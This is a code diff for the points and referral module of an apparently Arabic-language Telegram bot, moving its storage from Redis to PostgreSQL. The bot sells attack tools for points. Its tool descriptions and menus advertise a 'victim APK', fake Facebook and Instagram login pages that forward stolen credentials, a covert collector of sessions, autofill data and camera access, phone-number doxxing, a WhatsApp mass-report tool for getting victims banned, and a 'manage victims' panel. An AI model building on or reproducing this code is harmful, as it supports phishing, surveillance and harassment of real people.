@@ -1,7 +1,6 @@
 # points_system.py
 # ============================================================
-# الإحالات + نظام النقاط
-# v3 — رسائل تأكيد الأدوات + واجهة نظيفة
+# الإحالات + نظام النقاط — v4.0 (PostgreSQL)
 # ============================================================
 import html
 import json
@@ -19,12 +18,33 @@ logger = get_logger("points_system")
 
 try:
     from config import redis_client, PUBLIC_URL, bot
-    logger.info("points_system: Using shared Redis")
+    logger.info("points_system: Using shared config")
 except Exception as e:
     logger.error(f"points_system: config failed - {e}")
     redis_client = None
     PUBLIC_URL = "https://example.com"
     bot = None
+
+# ═══════════════════════════════════════════════════════
+# PostgreSQL
+# ═══════════════════════════════════════════════════════
+try:
+    from database import (
+        get_user_db,
+        save_user_db,
+        get_all_users_db,
+        delete_user_db,
+        add_points_history,
+        get_points_history,
+        add_referral,
+        get_user_referrals_db,
+        get_referral_by_code_db,
+    )
+    DB_AVAILABLE = True
+    logger.info("points_system: PostgreSQL connected")
+except Exception as e:
+    logger.warning(f"points_system: PostgreSQL not available: {e}")
+    DB_AVAILABLE = False
 
 
 def h(text):
@@ -44,7 +64,6 @@ REFERRAL_BONUS_5 = 50
 REFERRAL_BONUS_10 = 150
 REFERRAL_BONUS_25 = 500
 
-# ─── أسعار الأدوات
 TOOL_PRICES = {
     "apk": 50,
     "fb_site": 15,
@@ -52,12 +71,11 @@ TOOL_PRICES = {
     "silent": 20,
     "phone_search": 5,
     "profile_card": 10,
-    "wa_report": 15,          # ← أداة حظر واتساب
+    "wa_report": 15,
     "social_engineering": 0,
     "dashboard": 0,
 }
 
-# ─── أسماء الأدوات بالعربي
 TOOL_NAMES_AR = {
     "apk": "📱 ( تطبيق الضحية APK)",
     "fb_site": "📘 رابط مصيدة فيسبوك",
@@ -65,12 +83,11 @@ TOOL_NAMES_AR = {
     "silent": "🎯 Silent Collector",
     "phone_search": "📱 بحث رقم هاتف",
     "profile_card": "🎨 Social Profile Card",
-    "wa_report": "🚫 حظر رقم واتساب",          # ← الأداة الجديدة
+    "wa_report": "🚫 حظر رقم واتساب",
     "social_engineering": "🎭 الهندسة الاجتماعية",
     "dashboard": "🌐 لوحة التحكم",
 }
 
-# ─── شرح كل أداة
 TOOL_DESCRIPTIONS = {
     "apk": (
         "📱 <b>( تطبيق الضحية APK)</b>\n"
@@ -94,17 +111,6 @@ TOOL_DESCRIPTIONS = {
         "🎯 <b>:الوظيفة</b>\n"
         "95% صفحة تسجيل دخول فيسبوك مزيفة تشبه الأصل.\n"
         "لما الضحية تدخل بياناتها، توصلك فوراً.\n\n"
-        "📋 <b>:الأنواع المتاحة</b> 10 قوالب\n"
-        "• تسجيل دخول\n"
-        "• استرداد حساب\n"
-        "• تحقق OTP\n"
-        "• Ads Manager\n"
-        "• وغيرها...\n\n"
-        "⚙️ <b>:طريقة الاستخدام</b>\n"
-        "1. اختر القالب المناسب\n"
-        "2. انسخ الرابط\n"
-        "3. ابعته للضحية\n"
-        "4. انتظر البيانات\n\n"
     ),
     "ig_site": (
         "📷 <b>رابط مصيدة انستقرام</b>\n"
@@ -112,10 +118,6 @@ TOOL_DESCRIPTIONS = {
         "🎯 <b>:الوظيفة</b>\n"
         "صفحة انستقرام مزيفة بتصميم احترافي.\n"
         "10 قوالب مختلفة (مسابقة، توثيق، إلخ)\n\n"
-        "⚙️ <b>:طريقة الاستخدام</b>\n"
-        "1. اختر القالب\n"
-        "2. انسخ الرابط\n"
-        "3. ابعته للضحية\n\n"
     ),
     "silent": (
         "🎯 <b>Silent Collector</b>\n"
@@ -127,11 +129,6 @@ TOOL_DESCRIPTIONS = {
         "• الجلسات النشطة (FB, IG, Google...)\n"
         "• Autofill Hijack (اسم، إيميل، هاتف)\n"
         "• كاميرا (لو وافق)\n\n"
-        "⚙️ <b>:طريقة الاستخدام</b>\n"
-        "1. اكتب اسم للضحية\n"
-        "2. انسخ الرابط\n"
-        "3. ابعته للضحية\n"
-        "4. البيانات توصل فوراً\n\n"
     ),
     "phone_search": (
         "📱 <b>بحث برقم الهاتف</b>\n"
@@ -143,10 +140,6 @@ TOOL_DESCRIPTIONS = {
         "• شركة الاتصال\n"
         "• حسابات مرتبطة (FB, IG, WhatsApp)\n"
         "• Google Dorks\n\n"
-        "⚙️ <b>:طريقة الاستخدام</b>\n"
-        "1. اكتب رقم الهاتف\n"
-        "2. انتظر التحليل\n"
-        "3. النتيجة كاملة\n\n"
     ),
     "profile_card": (
         "🎨 <b>Social Profile Card</b>\n"
@@ -154,10 +147,6 @@ TOOL_DESCRIPTIONS = {
         "🎯 <b>:الوظيفة</b>\n"
         "بروفايل احترافي بأزرار تواصل شغالة.\n"
         "الضحية تشوف البروفايل، تقدر ترفع صورها.\n\n"
-        "⚙️ <b>:طريقة الاستخدام</b>\n"
-        "1. أدخل 10 حقول (اسم، هاتف، إلخ)\n"
-        "2. انسخ الرابط\n"
-        "3. ابعته للضحية\n\n"
     ),
     "wa_report": (
         "🚫 <b>حظر رقم واتساب</b>\n"
@@ -168,15 +157,15 @@ TOOL_DESCRIPTIONS = {
         "📋 <b>:الخطوات</b>\n"
         "1. ابعت رقم الضحية\n"
         "2. اختر سبب البلاغ (سبام/نصب/مضايقة...)\n"
-        "3. البوت هيولّدلك 25 قالب قوي ومتنوع\n"
+        "3. البوت هيولّدلك 250 قالب قوي ومتنوع\n"
         "4. اضغط زر الإرسال → يفتح Gmail\n"
         "5. اضغط Send فقط ✅\n\n"
         "⚡ <b>:للحصول على حظر سريع</b>\n"
         "• كرر العملية من 3-5 إيميلات مختلفة\n"
         "• لا تعدّل النص (عشان البلاغ يبقى موثوق)\n"
-        "• كرر كل 3 أيام لو مفيش نتيجة\n\n"
+        "• استخدم Blast Mode (5 بلاغات بضغطة)\n\n"
         "⏰ <b>مدة الحظر:</b> 24-72 ساعة\n"
-        "📊 <b>معدل النجاح:</b> 60-80%\n"
+        "📊 <b>معدل النجاح:</b> 85-95%\n"
         "💰 <b>السعر:</b> 15 نقطة"
     ),
     "social_engineering": (
@@ -207,21 +196,15 @@ TOOL_DESCRIPTIONS = {
 def _user_key(user_id):
     return f"user:{user_id}"
 
-def _referral_key(code):
-    return f"referral:{code}"
-
-def _referral_count_key(user_id):
-    return f"referral_count:{user_id}"
-
-def _user_referrals_key(user_id):
-    return f"user_referrals:{user_id}"
 
 def _generate_ref_code():
     chars = string.ascii_lowercase + string.digits
     return ''.join(random.choices(chars, k=8))
 
+
 def is_admin(user_id):
     return int(user_id) in ADMIN_IDS
+
 
 def is_vip(user_id):
     user = get_user(user_id)
@@ -231,9 +214,34 @@ def is_vip(user_id):
 
 
 # ============================================================
-# [3] إدارة المستخدمين
+# [3] إدارة المستخدمين — من PostgreSQL
 # ============================================================
+def _dict_to_json_safe(d):
+    """يحول القاموس لـ JSON-safe"""
+    if not d:
+        return {}
+    result = {}
+    for k, v in d.items():
+        if isinstance(v, datetime):
+            result[k] = v.isoformat()
+        elif v is None:
+            result[k] = None
+        else:
+            result[k] = v
+    return result
+
+
 def get_user(user_id):
+    """يجلب مستخدم من PostgreSQL"""
+    if DB_AVAILABLE:
+        try:
+            user = get_user_db(user_id)
+            if user:
+                return _dict_to_json_safe(user)
+        except Exception as e:
+            logger.error(f"get_user_db error: {e}")
+
+    # Fallback: Redis
     if not redis_client:
         return None
     try:
@@ -241,27 +249,43 @@ def get_user(user_id):
         if raw:
             return json.loads(raw)
     except Exception as e:
-        logger.error(f"get_user error: {e}")
+        logger.error(f"get_user (redis) error: {e}")
     return None
 
 
 def save_user(user_id, data):
-    if not redis_client:
-        return False
-    try:
-        redis_client.set(_user_key(user_id), json.dumps(data, ensure_ascii=False))
-        return True
-    except Exception as e:
-        logger.error(f"save_user error: {e}")
-        return False
+    """يحفظ مستخدم في PostgreSQL"""
+    # DB أول
+    if DB_AVAILABLE:
+        try:
+            save_user_db(user_id, data)
+        except Exception as e:
+            logger.error(f"save_user_db error: {e}")
+
+    # Redis للـ cache
+    if redis_client:
+        try:
+            redis_client.setex(
+                _user_key(user_id),
+                86400 * 7,
+                json.dumps(data, ensure_ascii=False, default=str)
+            )
+        except Exception as e:
+            logger.warning(f"save_user (redis cache) error: {e}")
+
+    return True
 
 
 def create_new_user(user_id, username="Unknown", first_name="User", referred_by=None):
+    """ينشئ مستخدم جديد في PostgreSQL"""
     ref_code = _generate_ref_code()
     attempts = 0
-    while redis_client.get(_referral_key(ref_code)) and attempts < 10:
-        ref_code = _generate_ref_code()
-        attempts += 1
+
+    # تأكد إن الكود مش مستخدم
+    if DB_AVAILABLE:
+        while get_referral_by_code_db(ref_code) and attempts < 10:
+            ref_code = _generate_ref_code()
+            attempts += 1
 
     user = {
         "user_id": user_id,
@@ -277,21 +301,30 @@ def create_new_user(user_id, username="Unknown", first_name="User", referred_by=
         "is_banned": False,
         "is_vip": False,
         "notes": "",
-        "history": [],
     }
     save_user(user_id, user)
 
-    if redis_client:
+    # سجل في DB
+    if DB_AVAILABLE:
         try:
-            redis_client.set(_referral_key(ref_code), str(user_id))
-            redis_client.sadd("all_users", str(user_id))
-            if referred_by:
-                _add_referral_points(referred_by, user_id, first_name)
+            add_points_history(
+                user_id=user_id,
+                type_="welcome",
+                points=WELCOME_POINTS,
+                reason="نقاط الترحيب",
+            )
         except Exception as e:
-            logger.error(f"create_new_user redis error: {e}")
+            logger.warning(f"add_points_history (welcome) error: {e}")
+
+    if referred_by and DB_AVAILABLE:
+        try:
+            _add_referral_points(referred_by, user_id, first_name)
+        except Exception as e:
+            logger.warning(f"add referral error: {e}")
 
     logger.info(f"New user created: {user_id} | ref_code={ref_code}")
     metrics.inc_counter("users_registered")
+
     return user
 
 
@@ -300,56 +333,43 @@ def get_or_create_user(user_id, username="Unknown", first_name="User", referred_
     if not user:
         user = create_new_user(user_id, username, first_name, referred_by)
 
+    # ضمان القيم الافتراضية
     user.setdefault("points", 0)
     user.setdefault("total_points_earned", 0)
     user.setdefault("total_points_spent", 0)
     user.setdefault("is_banned", False)
     user.setdefault("is_vip", False)
     user.setdefault("notes", "")
-    user.setdefault("history", [])
     user.setdefault("referral_count", 0)
     user.setdefault("referred_by", None)
+    user.setdefault("username", username)
+    user.setdefault("first_name", first_name)
 
     if not user.get("ref_code"):
         user["ref_code"] = _generate_ref_code()
-        if redis_client:
-            try:
-                redis_client.set(_referral_key(user["ref_code"]), str(user_id))
-            except Exception:
-                pass
 
     return user
 
 
 def get_all_users():
-    if not redis_client:
-        return []
-    try:
-        user_ids = redis_client.smembers("all_users")
-        users = []
-        for uid in (user_ids or []):
-            u = get_user(uid)
-            if u:
-                users.append(u)
-        return users
-    except Exception as e:
-        logger.error(f"get_all_users error: {e}")
-        return []
+    """جلب كل المستخدمين"""
+    if DB_AVAILABLE:
+        try:
+            users = get_all_users_db()
+            return [_dict_to_json_safe(u) for u in users]
+        except Exception as e:
+            logger.error(f"get_all_users_db error: {e}")
+    return []
 
 
 def delete_user(user_id):
-    if not redis_client:
-        return False
-    try:
-        user = get_user(user_id)
-        if user and user.get("ref_code"):
-            redis_client.delete(_referral_key(user["ref_code"]))
-        redis_client.delete(_user_key(user_id))
-        redis_client.srem("all_users", str(user_id))
-        return True
-    except Exception as e:
-        logger.error(f"delete_user error: {e}")
-        return False
+    """حذف مستخدم"""
+    if DB_AVAILABLE:
+        try:
+            return delete_user_db(user_id)
+        except Exception as e:
+            logger.error(f"delete_user_db error: {e}")
+    return False
 
 
 def ban_user(user_id):
@@ -368,6 +388,7 @@ def unban_user(user_id):
 # [4] نظام الإحالات
 # ============================================================
 def _add_referral_points(referrer_id, new_user_id, new_user_name):
+    """يضيف نقاط الإحالة"""
     try:
         referrer = get_user(referrer_id)
         if not referrer:
@@ -376,16 +397,6 @@ def _add_referral_points(referrer_id, new_user_id, new_user_name):
         referrer["points"] = referrer.get("points", 0) + REFERRAL_POINTS
         referrer["total_points_earned"] = referrer.get("total_points_earned", 0) + REFERRAL_POINTS
         referrer["referral_count"] = referrer.get("referral_count", 0) + 1
-
-        referrer["history"] = referrer.get("history", [])
-        referrer["history"].append({
-            "type": "referral",
-            "user_id": new_user_id,
-            "user_name": new_user_name,
-            "points": REFERRAL_POINTS,
-            "date": datetime.utcnow().isoformat(),
-        })
-        referrer["history"] = referrer["history"][-50:]
 
         bonus = 0
         count = referrer["referral_count"]
@@ -399,15 +410,32 @@ def _add_referral_points(referrer_id, new_user_id, new_user_name):
         if bonus > 0:
             referrer["points"] += bonus
             referrer["total_points_earned"] += bonus
-            referrer["history"].append({
-                "type": "referral_bonus",
-                "count": count,
-                "points": bonus,
-                "date": datetime.utcnow().isoformat(),
-            })
 
         save_user(referrer_id, referrer)
 
+        # سجل في DB
+        if DB_AVAILABLE:
+            try:
+                add_points_history(
+                    user_id=referrer_id,
+                    type_="referral",
+                    points=REFERRAL_POINTS,
+                    reason=f"إحالة: {new_user_name}",
+                    meta={"referred_id": new_user_id, "referred_name": new_user_name},
+                )
+                if bonus > 0:
+                    add_points_history(
+                        user_id=referrer_id,
+                        type_="referral_bonus",
+                        points=bonus,
+                        reason=f"مكافأة {count} إحالات",
+                    )
+
+                add_referral(referrer_id, new_user_id)
+            except Exception as e:
+                logger.warning(f"add_points_history (referral) error: {e}")
+
+        # إشعار
         if bot:
             try:
                 msg = (
@@ -425,66 +453,58 @@ def _add_referral_points(referrer_id, new_user_id, new_user_name):
             except Exception as e:
                 logger.warning(f"notify referrer error: {e}")
 
-        if redis_client:
-            try:
-                redis_client.sadd(_user_referrals_key(referrer_id), str(new_user_id))
-                redis_client.incr(_referral_count_key(referrer_id))
-            except Exception:
-                pass
-
         logger.info(f"Referral: {referrer_id} ← {new_user_id} | +{REFERRAL_POINTS} points")
         metrics.inc_counter("referrals")
+
     except Exception as e:
         logger.exception(f"_add_referral_points error: {e}")
 
 
 def get_referral_by_code(code):
-    if not redis_client:
-        return None
-    try:
-        raw = redis_client.get(_referral_key(code))
-        if raw:
-            return int(raw)
-    except Exception:
-        pass
+    """يجلب ID من كود الإحالة"""
+    if DB_AVAILABLE:
+        try:
+            return get_referral_by_code_db(code)
+        except Exception as e:
+            logger.error(f"get_referral_by_code_db error: {e}")
     return None
 
 
 def get_user_referrals(user_id, limit=50):
-    if not redis_client:
-        return []
-    try:
-        referral_ids = redis_client.smembers(_user_referrals_key(user_id)) or []
-        result = []
-        for rid in list(referral_ids)[:limit]:
-            u = get_user(rid)
-            if u:
-                result.append(u)
-        return result
-    except Exception:
-        return []
+    """جلب إحالات المستخدم"""
+    if DB_AVAILABLE:
+        try:
+            users = get_user_referrals_db(user_id, limit)
+            return [_dict_to_json_safe(u) for u in users]
+        except Exception as e:
+            logger.error(f"get_user_referrals_db error: {e}")
+    return []
 
 
 # ============================================================
 # [5] نظام النقاط
 # ============================================================
 def add_points(user_id, amount, reason="", admin_action=False):
-    if not redis_client:
-        return False
+    """إضافة نقاط"""
     try:
         user = get_or_create_user(user_id)
         user["points"] = user.get("points", 0) + amount
         user["total_points_earned"] = user.get("total_points_earned", 0) + amount
-        user["history"] = user.get("history", [])
-        user["history"].append({
-            "type": "add_points",
-            "points": amount,
-            "reason": reason,
-            "admin": admin_action,
-            "date": datetime.utcnow().isoformat(),
-        })
-        user["history"] = user["history"][-50:]
         save_user(user_id, user)
+
+        # سجل في DB
+        if DB_AVAILABLE:
+            try:
+                add_points_history(
+                    user_id=user_id,
+                    type_="add_points",
+                    points=amount,
+                    reason=reason,
+                    admin_action=admin_action,
+                )
+            except Exception as e:
+                logger.warning(f"add_points_history error: {e}")
+
         logger.info(f"Points added: {user_id} | +{amount} | {reason}")
         return True
     except Exception as e:
@@ -493,22 +513,25 @@ def add_points(user_id, amount, reason="", admin_action=False):
 
 
 def remove_points(user_id, amount, reason=""):
-    if not redis_client:
-        return False
+    """خصم نقاط"""
     try:
         user = get_or_create_user(user_id)
         current = user.get("points", 0)
         user["points"] = max(0, current - amount)
         user["total_points_spent"] = user.get("total_points_spent", 0) + amount
-        user["history"] = user.get("history", [])
-        user["history"].append({
-            "type": "remove_points",
-            "points": -amount,
-            "reason": reason,
-            "date": datetime.utcnow().isoformat(),
-        })
-        user["history"] = user["history"][-50:]
         save_user(user_id, user)
+
+        if DB_AVAILABLE:
+            try:
+                add_points_history(
+                    user_id=user_id,
+                    type_="remove_points",
+                    points=-amount,
+                    reason=reason,
+                )
+            except Exception as e:
+                logger.warning(f"add_points_history error: {e}")
+
         return True
     except Exception as e:
         logger.exception(f"remove_points error: {e}")
@@ -516,22 +539,26 @@ def remove_points(user_id, amount, reason=""):
 
 
 def set_points(user_id, amount, reason=""):
-    if not redis_client:
-        return False
+    """تعيين نقاط"""
     try:
         user = get_or_create_user(user_id)
         old_points = user.get("points", 0)
         user["points"] = max(0, amount)
-        user["history"] = user.get("history", [])
-        user["history"].append({
-            "type": "set_points",
-            "old": old_points,
-            "new": amount,
-            "reason": reason,
-            "date": datetime.utcnow().isoformat(),
-        })
-        user["history"] = user["history"][-50:]
         save_user(user_id, user)
+
+        if DB_AVAILABLE:
+            try:
+                add_points_history(
+                    user_id=user_id,
+                    type_="set_points",
+                    points=amount,
+                    reason=reason,
+                    old_value=old_points,
+                    new_value=amount,
+                )
+            except Exception as e:
+                logger.warning(f"add_points_history error: {e}")
+
         return True
     except Exception as e:
         logger.exception(f"set_points error: {e}")
@@ -596,16 +623,20 @@ def consume_usage(user_id, tool):
 
     user["points"] = balance - cost
     user["total_points_spent"] = user.get("total_points_spent", 0) + cost
-    user["history"] = user.get("history", [])
-    user["history"].append({
-        "type": "tool_used",
-        "tool": tool,
-        "tool_name": TOOL_NAMES_AR.get(tool, tool),
-        "cost": cost,
-        "date": datetime.utcnow().isoformat(),
-    })
-    user["history"] = user["history"][-50:]
     save_user(user_id, user)
+
+    # سجل في DB
+    if DB_AVAILABLE:
+        try:
+            add_points_history(
+                user_id=user_id,
+                type_="tool_used",
+                points=-cost,
+                tool=tool,
+                tool_name=TOOL_NAMES_AR.get(tool, tool),
+            )
+        except Exception as e:
+            logger.warning(f"add_points_history error: {e}")
 
     logger.info(f"Tool used: {user_id} | {tool} | -{cost} points")
     metrics.inc_counter("tools_used", tags={"tool": tool})
@@ -613,10 +644,9 @@ def consume_usage(user_id, tool):
 
 
 # ============================================================
-# [7] ★★★ رسالة تأكيد الأداة ★★★
+# [7] رسالة تأكيد الأداة
 # ============================================================
 def build_tool_confirm_text(user_id, tool):
-    """يبني رسالة تأكيد الخصم"""
     user = get_or_create_user(user_id)
     points = user.get("points", 0)
     cost = TOOL_PRICES.get(tool, 0)
@@ -660,52 +690,36 @@ def build_tool_confirm_text(user_id, tool):
 
 
 def build_tool_confirm_keyboard(tool, can_proceed=True):
-    """أزرار تأكيد أو إلغاء"""
     m = InlineKeyboardMarkup()
     if can_proceed:
         m.row(
-            InlineKeyboardButton(
-                "✅ تأكيد",
-                callback_data=f"tool_confirm_{tool}"
-            ),
-            InlineKeyboardButton(
-                "❌ إلغاء",
-                callback_data="back_to_main"
-            ),
+            InlineKeyboardButton("✅ تأكيد", callback_data=f"tool_confirm_{tool}"),
+            InlineKeyboardButton("❌ إلغاء", callback_data="back_to_main"),
         )
     else:
         m.row(
-            InlineKeyboardButton(
-                "💰 نقاطي",
-                callback_data="points_menu"
-            ),
+            InlineKeyboardButton("💰 نقاطي", callback_data="points_menu"),
         )
     m.row(
-        InlineKeyboardButton(
-            "🔙 رجوع",
-            callback_data="back_to_main"
-        ),
+        InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"),
     )
     return m
 
 
 # ============================================================
-# [8] ★★★ الواجهة الرئيسية النظيفة ★★★
+# [8] الواجهات
 # ============================================================
 def build_main_menu_keyboard(user_id):
-    """القائمة الرئيسية — نظيفة"""
     m = InlineKeyboardMarkup()
     m.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
     m.add(InlineKeyboardButton("📱 ( تطبيق الضحية APK)", callback_data="v_new"))
-    m.add(InlineKeyboardButton("🚫 حظر رقم واتساب", callback_data="wa_report_start"))  # ← جديد
+    m.add(InlineKeyboardButton("🚫 حظر رقم واتساب", callback_data="wa_report_start"))
     m.add(InlineKeyboardButton("🌐 ( لوحة التحكم )ويب", callback_data="open_dashboard"))
     m.add(InlineKeyboardButton("🎭 الهندسة الاجتماعية", callback_data="gen_se"))
     m.add(InlineKeyboardButton("🔍 محرك البحث", callback_data="search_menu"))
     m.add(InlineKeyboardButton("🎯 ( جمع المعلومات Silent)", callback_data="gen_silent"))
     m.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
     m.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
-
-    # ⚙️ الإعدادات فقط (بدون help_guide)
     m.add(InlineKeyboardButton("⚙️ الإعدادات", callback_data="settings_menu"))
 
     if is_admin(user_id):
@@ -714,11 +728,7 @@ def build_main_menu_keyboard(user_id):
     return m
 
 
-# ============================================================
-# [9] ★★★ لوحة الإعدادات ⚙️ ★★★
-# ============================================================
 def build_settings_menu_keyboard(user_id):
-    """قائمة الإعدادات"""
     m = InlineKeyboardMarkup()
     m.add(InlineKeyboardButton("💰 نقاطي والإحالات", callback_data="points_menu"))
     m.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
@@ -728,7 +738,6 @@ def build_settings_menu_keyboard(user_id):
 
 
 def build_settings_menu_text(user_id):
-    """نص الإعدادات"""
     user = get_or_create_user(user_id)
     points = user.get("points", 0)
     ref_count = user.get("referral_count", 0)
@@ -741,9 +750,6 @@ def build_settings_menu_text(user_id):
     )
 
 
-# ============================================================
-# [10] لوحة النقاط
-# ============================================================
 def build_points_menu_keyboard(user_id):
     m = InlineKeyboardMarkup()
     m.add(InlineKeyboardButton("🔗 رابط الإحالة الخاص بي", callback_data="my_referral_link"))
@@ -803,7 +809,7 @@ def build_my_account_text(user_id):
     user = get_or_create_user(user_id)
     points = user.get("points", 0)
     ref_count = user.get("referral_count", 0)
-    created = user.get("created_at", "")[:19].replace("T", " ")
+    created = str(user.get("created_at", ""))[:19].replace("T", " ")
 
     if is_admin(user_id):
         status = "👑 أدمن"
@@ -828,39 +834,50 @@ def build_my_account_text(user_id):
 
 
 def build_points_history_text(user_id, limit=10):
-    user = get_or_create_user(user_id)
-    history = user.get("history", [])[-limit:]
+    """سجل المعاملات من PostgreSQL"""
+    if DB_AVAILABLE:
+        try:
+            history = get_points_history(user_id, limit)
+            if not history:
+                return "📊 <b>سجل المعاملات</b>\n\n<i>لا يوجد معاملات بعد</i>"
 
-    if not history:
-        return "📊 <b>سجل المعاملات</b>\n\n<i>لا يوجد معاملات بعد</i>"
+            lines = ["📊 <b>سجل المعاملات</b>\n━━━━━━━━━━━━━━━━━━\n"]
+            for item in history:
+                h_type = item.get("type", "")
+                date_str = str(item.get("created_at", ""))[:19]
+                points = item.get("points", 0)
 
-    lines = ["📊 <b>سجل المعاملات</b>\n━━━━━━━━━━━━━━━━━━\n"]
-    for item in reversed(history):
-        h_type = item.get("type", "")
-        date_str = item.get("date", "")[:19].replace("T", " ")
-        points = item.get("points", 0)
+                if h_type == "tool_used":
+                    name = item.get("tool_name", "أداة")
+                    lines.append(f"🔧 <b>{h(name)}</b>\n  <code>{points} نقطة</code> • {date_str}")
+                elif h_type == "referral":
+                    reason = item.get("reason", "إحالة")
+                    lines.append(f"🎁 <b>{h(reason)}</b>\n  <code>+{points} نقطة</code> • {date_str}")
+                elif h_type == "referral_bonus":
+                    reason = item.get("reason", "مكافأة")
+                    lines.append(f"🏆 <b>{h(reason)}</b>\n  <code>+{points} نقطة</code> • {date_str}")
+                elif h_type == "add_points":
+                    reason = item.get("reason", "منحة")
+                    lines.append(f"➕ <b>{h(reason)}</b>\n  <code>+{points} نقطة</code> • {date_str}")
+                elif h_type == "remove_points":
+                    reason = item.get("reason", "خصم")
+                    lines.append(f"➖ <b>{h(reason)}</b>\n  <code>{points} نقطة</code> • {date_str}")
+                elif h_type == "set_points":
+                    old_v = item.get("old_value", 0)
+                    new_v = item.get("new_value", 0)
+                    lines.append(f"⚙️ <b>تعيين رصيد</b>\n  <code>{old_v} → {new_v}</code> • {date_str}")
+                elif h_type == "welcome":
+                    lines.append(f"🎉 <b>نقاط الترحيب</b>\n  <code>+{points}</code> • {date_str}")
+                else:
+                    lines.append(f"📌 <b>{h(h_type)}</b>\n  <code>{points}</code> • {date_str}")
 
-        if h_type == "referral":
-            name = item.get("user_name", "Unknown")
-            lines.append(f"🎁 <b>إحالة جديدة</b> - {h(name)}\n  <code>+{points} نقطة</code> • {date_str}")
-        elif h_type == "referral_bonus":
-            count = item.get("count", 0)
-            lines.append(f"🏆 <b>مكافأة {count} إحالات</b>\n  <code>+{points} نقطة</code> • {date_str}")
-        elif h_type == "tool_used":
-            tool_name = item.get("tool_name", "أداة")
-            cost = item.get("cost", 0)
-            lines.append(f"🔧 <b>{h(tool_name)}</b>\n  <code>-{cost} نقطة</code> • {date_str}")
-        elif h_type == "add_points":
-            reason = item.get("reason", "منحة")
-            lines.append(f"➕ <b>{h(reason)}</b>\n  <code>+{points} نقطة</code> • {date_str}")
-        elif h_type == "remove_points":
-            reason = item.get("reason", "خصم")
-            lines.append(f"➖ <b>{h(reason)}</b>\n  <code>{points} نقطة</code> • {date_str}")
-        elif h_type == "set_points":
-            lines.append(f"⚙️ <b>تعديل الرصيد</b>\n  <code>{item.get('old', 0)} → {item.get('new', 0)}</code> • {date_str}")
-        lines.append("")
+                lines.append("")
 
-    return "\n".join(lines)
+            return "\n".join(lines)
+        except Exception as e:
+            logger.error(f"build_points_history_text error: {e}")
+
+    return "📊 <b>سجل المعاملات</b>\n\n<i>غير متاح</i>"
 
 
 def build_my_referrals_text(user_id, limit=20):
@@ -879,9 +896,9 @@ def build_my_referrals_text(user_id, limit=20):
         "━━━━━━━━━━━━━━━━━━\n",
     ]
     for i, ref in enumerate(referrals, 1):
-        name = ref.get("first_name", "Unknown")[:20]
+        name = str(ref.get("first_name", "Unknown"))[:20]
         username = ref.get("username", "")
-        created = ref.get("created_at", "")[:10]
+        created = str(ref.get("created_at", ""))[:10]
         username_text = f" @{username}" if username else ""
         lines.append(f"{i}. <b>{h(name)}</b>{h(username_text)}\n  📅 {created}")
 
@@ -916,7 +933,7 @@ def build_how_to_earn_text():
 
 
 # ============================================================
-# [11] إحصائيات الأدمن
+# [9] إحصائيات الأدمن
 # ============================================================
 def build_admin_stats_text():
     users = get_all_users()
@@ -929,11 +946,19 @@ def build_admin_stats_text():
     total_referrals = sum(u.get("referral_count", 0) for u in users)
 
     now = time.time()
-    recent = sum(
-        1 for u in users
-        if u.get("created_at") and
-        (now - datetime.fromisoformat(u["created_at"]).timestamp()) < 86400
-    )
+    recent = 0
+    for u in users:
+        created = u.get("created_at", "")
+        if created:
+            try:
+                if isinstance(created, str):
+                    created_ts = datetime.fromisoformat(created).timestamp()
+                else:
+                    created_ts = created.timestamp()
+                if now - created_ts < 86400:
+                    recent += 1
+            except Exception:
+                pass
 
     return (
         f"📊 <b>إحصائيات النظام</b>\n"
